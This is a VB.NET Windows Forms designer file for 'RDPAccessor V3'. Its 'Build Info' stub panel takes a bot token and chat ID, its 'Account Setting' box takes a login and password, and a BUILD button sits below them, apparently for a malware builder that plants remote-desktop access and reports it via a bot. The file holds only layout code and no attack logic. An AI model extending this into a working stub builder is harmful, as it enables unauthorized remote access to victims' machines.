Imports System

Namespace RDPAccessor
    Partial Class Form1
        ''' <summary>
        ''' Обязательная переменная конструктора.
        ''' </summary>
        Private components As ComponentModel.IContainer = Nothing

        ''' <summary>
        ''' Освободить все используемые ресурсы.
        ''' </summary>
        ''' <paramname="disposing">истинно, если управляемый ресурс должен быть удален; иначе ложно.</param>
        Protected Overrides Sub Dispose(disposing As Boolean)
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
            MyBase.Dispose(disposing)
        End Sub

#Region "Код, автоматически созданный конструктором форм Windows"

        ''' <summary>
        ''' Требуемый метод для поддержки конструктора — не изменяйте 
        ''' содержимое этого метода с помощью редактора кода.
        ''' </summary>
        Private Sub InitializeComponent()
            Dim resources As ComponentModel.ComponentResourceManager = New ComponentModel.ComponentResourceManager(GetType(Form1))
            botTestBox = New Windows.Forms.GroupBox()
            accPasswdBox = New Windows.Forms.TextBox()
            accUsernameBox = New Windows.Forms.TextBox()
            label5 = New Windows.Forms.Label()
            label4 = New Windows.Forms.Label()
            stubBuildPanel = New Windows.Forms.GroupBox()
            label3 = New Windows.Forms.Label()
            chatidBox = New Windows.Forms.TextBox()
            label2 = New Windows.Forms.Label()
            botTokenBox = New Windows.Forms.TextBox()
            panel1 = New Windows.Forms.Panel()
            statusLabel = New Windows.Forms.Label()
            label1 = New Windows.Forms.Label()
            buildBtn = New Windows.Forms.Button()
            saveBuildFile = New Windows.Forms.SaveFileDialog()
            pictureBox1 = New Windows.Forms.PictureBox()
            minimazeBtn = New Windows.Forms.PictureBox()
            closeBtn = New Windows.Forms.PictureBox()
            botTestBox.SuspendLayout()
            stubBuildPanel.SuspendLayout()
            panel1.SuspendLayout()
            CType(pictureBox1, ComponentModel.ISupportInitialize).BeginInit()
            CType(minimazeBtn, ComponentModel.ISupportInitialize).BeginInit()
            CType(closeBtn, ComponentModel.ISupportInitialize).BeginInit()
            SuspendLayout()
            ' 
            ' botTestBox
            ' 
            botTestBox.BackColor = Drawing.Color.FromArgb(0, 7, 101, 45)
            botTestBox.Controls.Add(accPasswdBox)
            botTestBox.Controls.Add(accUsernameBox)
            botTestBox.Controls.Add(label5)
            botTestBox.Controls.Add(label4)
            botTestBox.FlatStyle = Windows.Forms.FlatStyle.Flat
            botTestBox.Font = New Drawing.Font("Consolas", 8.25F, Drawing.FontStyle.Bold, Drawing.GraphicsUnit.Point, 204)
            botTestBox.ForeColor = Drawing.Color.White
            botTestBox.Location = New Drawing.Point(12, 170)
            botTestBox.Name = "botTestBox"
            botTestBox.Size = New Drawing.Size(304, 89)
            botTestBox.TabIndex = 0
            botTestBox.TabStop = False
            botTestBox.Text = "Account Setting"
            ' 
            ' accPasswdBox
            ' 
            accPasswdBox.BackColor = Drawing.Color.FromArgb(30, 30, 30)
            accPasswdBox.BorderStyle = Windows.Forms.BorderStyle.FixedSingle
            accPasswdBox.Cursor = Windows.Forms.Cursors.Arrow
            accPasswdBox.ForeColor = Drawing.Color.Green
            accPasswdBox.Location = New Drawing.Point(58, 52)
            accPasswdBox.Multiline = True
            accPasswdBox.Name = "accPasswdBox"
            accPasswdBox.Size = New Drawing.Size(233, 20)
            accPasswdBox.TabIndex = 0
            ' 
            ' accUsernameBox
            ' 
            accUsernameBox.BackColor = Drawing.Color.FromArgb(30, 30, 30)
            accUsernameBox.BorderStyle = Windows.Forms.BorderStyle.FixedSingle
            accUsernameBox.Cursor = Windows.Forms.Cursors.Arrow
            accUsernameBox.ForeColor = Drawing.Color.Green
            accUsernameBox.Location = New Drawing.Point(58, 25)
            accUsernameBox.Multiline = True
            accUsernameBox.Name = "accUsernameBox"
            accUsernameBox.Size = New Drawing.Size(233, 20)
            accUsernameBox.TabIndex = 0
            ' 
            ' label5
            ' 
            label5.Font = New Drawing.Font("Consolas", 9.0F, Drawing.FontStyle.Bold, Drawing.GraphicsUnit.Point, 204)
            label5.ForeColor = Drawing.Color.White
            label5.Location = New Drawing.Point(3, 52)
            label5.Name = "label5"
            label5.Size = New Drawing.Size(50, 20)
            label5.TabIndex = 0
            label5.Text = "Pass"
            label5.TextAlign = Drawing.ContentAlignment.MiddleRight
            ' 
            ' label4
            ' 
            label4.Font = New Drawing.Font("Consolas", 9.0F, Drawing.FontStyle.Bold, Drawing.GraphicsUnit.Point, 204)
            label4.ForeColor = Drawing.Color.White
            label4.Location = New Drawing.Point(3, 25)
            label4.Name = "label4"
            label4.Size = New Drawing.Size(50, 20)
            label4.TabIndex = 0
            label4.Text = "Login"
            label4.TextAlign = Drawing.ContentAlignment.MiddleRight
            ' 
            ' stubBuildPanel
            ' 
            stubBuildPanel.BackColor = Drawing.Color.FromArgb(0, 7, 101, 45)
            stubBuildPanel.Controls.Add(label3)
            stubBuildPanel.Controls.Add(chatidBox)
            stubBuildPanel.Controls.Add(label2)
            stubBuildPanel.Controls.Add(botTokenBox)
            stubBuildPanel.FlatStyle = Windows.Forms.FlatStyle.Flat
            stubBuildPanel.Font = New Drawing.Font("Consolas", 8.25F, Drawing.FontStyle.Bold, Drawing.GraphicsUnit.Point, 204)
            stubBuildPanel.ForeColor = Drawing.Color.White
            stubBuildPanel.Location = New Drawing.Point(12, 61)
            stubBuildPanel.Name = "stubBuildPanel"
            stubBuildPanel.Size = New Drawing.Size(304, 97)
            stubBuildPanel.TabIndex = 0
            stubBuildPanel.TabStop = False
            stubBuildPanel.Text = "Build Info"
            ' 
            ' label3
            ' 
            label3.Font = New Drawing.Font("Consolas", 9.0F, Drawing.FontStyle.Bold, Drawing.GraphicsUnit.Point, 204)
            label3.ForeColor = Drawing.Color.White
            label3.Location = New Drawing.Point(3, 58)
            label3.Name = "label3"
            label3.Size = New Drawing.Size(50, 14)
            label3.TabIndex = 0
            label3.Text = "CHATID"
            label3.TextAlign = Drawing.ContentAlignment.MiddleRight
            ' 
            ' chatidBox
            ' 
            chatidBox.BackColor = Drawing.Color.FromArgb(30, 30, 30)
            chatidBox.BorderStyle = Windows.Forms.BorderStyle.FixedSingle
            chatidBox.Cursor = Windows.Forms.Cursors.Arrow
            chatidBox.ForeColor = Drawing.Color.Green
            chatidBox.Location = New Drawing.Point(58, 55)
            chatidBox.Multiline = True
            chatidBox.Name = "chatidBox"
            chatidBox.Size = New Drawing.Size(229, 20)
            chatidBox.TabIndex = 0
            ' 
            ' label2
            ' 
            label2.Font = New Drawing.Font("Consolas", 9.0F, Drawing.FontStyle.Bold, Drawing.GraphicsUnit.Point, 204)
            label2.ForeColor = Drawing.Color.White
            label2.Location = New Drawing.Point(3, 32)
            label2.Name = "label2"
            label2.Size = New Drawing.Size(50, 14)
            label2.TabIndex = 0
            label2.Text = "Token"
            label2.TextAlign = Drawing.ContentAlignment.MiddleRight
            ' 
            ' botTokenBox
            ' 
            botTokenBox.BackColor = Drawing.Color.FromArgb(30, 30, 30)
            botTokenBox.BorderStyle = Windows.Forms.BorderStyle.FixedSingle
            botTokenBox.Cursor = Windows.Forms.Cursors.Arrow
            botTokenBox.ForeColor = Drawing.Color.Green
            botTokenBox.Location = New Drawing.Point(58, 29)
            botTokenBox.Multiline = True
            botTokenBox.Name = "botTokenBox"
            botTokenBox.Size = New Drawing.Size(229, 20)
            botTokenBox.TabIndex = 0
            ' 
            ' panel1
            ' 
            panel1.BackColor = Drawing.Color.MediumSpringGreen
            panel1.Controls.Add(statusLabel)
            panel1.Dock = Windows.Forms.DockStyle.Bottom
            panel1.Location = New Drawing.Point(0, 339)
            panel1.Name = "panel1"
            panel1.Size = New Drawing.Size(328, 13)
            panel1.TabIndex = 0
            ' 
            ' statusLabel
            ' 
            statusLabel.Dock = Windows.Forms.DockStyle.Fill
            statusLabel.Font = New Drawing.Font("Consolas", 9.0F, Drawing.FontStyle.Bold, Drawing.GraphicsUnit.Point, 204)
            statusLabel.ForeColor = Drawing.Color.Black
            statusLabel.Location = New Drawing.Point(0, 0)
            statusLabel.Name = "statusLabel"
            statusLabel.Size = New Drawing.Size(328, 13)
            statusLabel.TabIndex = 0
            statusLabel.Text = "Status: Idle"
            ' 
            ' label1
            ' 
            label1.AutoSize = True
            label1.Font = New Drawing.Font("Calibri", 12.0F, Drawing.FontStyle.Regular, Drawing.GraphicsUnit.Point, 204)
            label1.ForeColor = Drawing.Color.White
            label1.Location = New Drawing.Point(55, 20)
            label1.Name = "label1"
            label1.Size = New Drawing.Size(114, 19)
            label1.TabIndex = 6
            label1.Text = "RDPAccessor V3"
            ' 
            ' buildBtn
            ' 
            buildBtn.BackColor = Drawing.Color.FromArgb(21, 21, 21)
            buildBtn.Cursor = Windows.Forms.Cursors.Hand
            buildBtn.FlatAppearance.MouseDownBackColor = Drawing.Color.Black
            buildBtn.FlatAppearance.MouseOverBackColor = Drawing.Color.Black
            buildBtn.FlatStyle = Windows.Forms.FlatStyle.Flat
            buildBtn.Font = New Drawing.Font("Calibri", 12.0F, Drawing.FontStyle.Bold, Drawing.GraphicsUnit.Point, 204)
            buildBtn.ForeColor = Drawing.Color.White
            buildBtn.Location = New Drawing.Point(88, 271)
            buildBtn.Name = "buildBtn"
            buildBtn.Size = New Drawing.Size(129, 35)
            buildBtn.TabIndex = 0
            buildBtn.Text = "BUILD"
            buildBtn.UseVisualStyleBackColor = False
            AddHandler buildBtn.Click, New EventHandler(AddressOf buildBtn_Click)
            ' 
            ' pictureBox1
            ' 
            pictureBox1.BackColor = Drawing.Color.Transparent
            pictureBox1.Cursor = Windows.Forms.Cursors.Arrow
            'pictureBox1.Image = Global.RDPAccessor.Properties.Resources.logo
            pictureBox1.Location = New Drawing.Point(15, 13)
            pictureBox1.Name = "pictureBox1"
            pictureBox1.Size = New Drawing.Size(34, 30)
            pictureBox1.SizeMode = Windows.Forms.PictureBoxSizeMode.StretchImage
            pictureBox1.TabIndex = 5
            pictureBox1.TabStop = False
            ' 
            ' minimazeBtn
            ' 
            minimazeBtn.BackColor = Drawing.Color.Transparent
            minimazeBtn.Cursor = Windows.Forms.Cursors.Hand
            'minimazeBtn.Image = Global.RDPAccessor.Properties.Resources.Horizontal_Line
            minimazeBtn.Location = New Drawing.Point(271, 11)
            minimazeBtn.Name = "minimazeBtn"
            minimazeBtn.Size = New Drawing.Size(17, 17)
            minimazeBtn.SizeMode = Windows.Forms.PictureBoxSizeMode.StretchImage
            minimazeBtn.TabIndex = 4
            minimazeBtn.TabStop = False
            AddHandler minimazeBtn.Click, New EventHandler(AddressOf minimazeBtn_Click)
            ' 
            ' closeBtn
            ' 
            closeBtn.BackColor = Drawing.Color.Transparent
            closeBtn.Cursor = Windows.Forms.Cursors.Hand
            'closeBtn.Image = Global.RDPAccessor.Properties.Resources.Close
            closeBtn.Location = New Drawing.Point(297, 11)
            closeBtn.Name = "closeBtn"
            closeBtn.Size = New Drawing.Size(17, 17)
            closeBtn.SizeMode = Windows.Forms.PictureBoxSizeMode.StretchImage
            closeBtn.TabIndex = 2
            closeBtn.TabStop = False
            AddHandler closeBtn.Click, New EventHandler(AddressOf closeBtn_Click)
            ' 
            ' Form1
            ' 
            AutoScaleDimensions = New Drawing.SizeF(6.0F, 13.0F)
            AutoScaleMode = Windows.Forms.AutoScaleMode.Font
            BackColor = Drawing.Color.FromArgb(21, 21, 21)
            ClientSize = New Drawing.Size(328, 352)
            Controls.Add(buildBtn)
            Controls.Add(label1)
            Controls.Add(pictureBox1)
            Controls.Add(minimazeBtn)
            Controls.Add(panel1)
            Controls.Add(closeBtn)
            Controls.Add(stubBuildPanel)
            Controls.Add(botTestBox)
            FormBorderStyle = Windows.Forms.FormBorderStyle.None
            Icon = CType(resources.GetObject("$this.Icon"), Drawing.Icon)
            Name = "Form1"
            StartPosition = Windows.Forms.FormStartPosition.CenterScreen
            Text = "RDPAccessor [Main]"
            AddHandler MouseDown, New Windows.Forms.MouseEventHandler(AddressOf Form1_MouseDown)
            botTestBox.ResumeLayout(False)
            botTestBox.PerformLayout()
            stubBuildPanel.ResumeLayout(False)
            stubBuildPanel.PerformLayout()
            panel1.ResumeLayout(False)
            CType(pictureBox1, ComponentModel.ISupportInitialize).EndInit()
            CType(minimazeBtn, ComponentModel.ISupportInitialize).EndInit()
            CType(closeBtn, ComponentModel.ISupportInitialize).EndInit()
            ResumeLayout(False)
            PerformLayout()

        End Sub

#End Region

        Private botTestBox As Windows.Forms.GroupBox
        Private stubBuildPanel As Windows.Forms.GroupBox
        Private closeBtn As Windows.Forms.PictureBox
        Private panel1 As Windows.Forms.Panel
        Private minimazeBtn As Windows.Forms.PictureBox
        Private pictureBox1 As Windows.Forms.PictureBox
        Private label1 As Windows.Forms.Label
        Private botTokenBox As Windows.Forms.TextBox
        Private label3 As Windows.Forms.Label
        Private chatidBox As Windows.Forms.TextBox
        Private label2 As Windows.Forms.Label
        Private accPasswdBox As Windows.Forms.TextBox
        Private accUsernameBox As Windows.Forms.TextBox
        Private label5 As Windows.Forms.Label
        Private label4 As Windows.Forms.Label
        Private buildBtn As Windows.Forms.Button
        Private statusLabel As Windows.Forms.Label
        Private saveBuildFile As Windows.Forms.SaveFileDialog
    End Class
End Namespace
